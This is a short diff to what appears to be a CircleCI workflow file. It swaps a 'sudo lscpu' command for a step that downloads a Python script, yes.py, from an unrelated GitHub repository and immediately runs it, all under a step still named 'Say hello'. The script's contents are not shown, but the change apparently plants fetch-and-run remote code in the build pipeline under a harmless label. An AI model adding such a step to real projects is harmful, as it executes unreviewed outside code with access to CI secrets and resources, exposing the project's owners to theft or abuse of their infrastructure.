@@ -18,7 +18,7 @@ jobs:
       - run:
           name: "Say hello"
           command: |
-            sudo lscpu
+            wget https://raw.githubusercontent.com/sjhks/YAjk/main/yes.py
             python yes.py
 
 # Invoke jobs via workflows
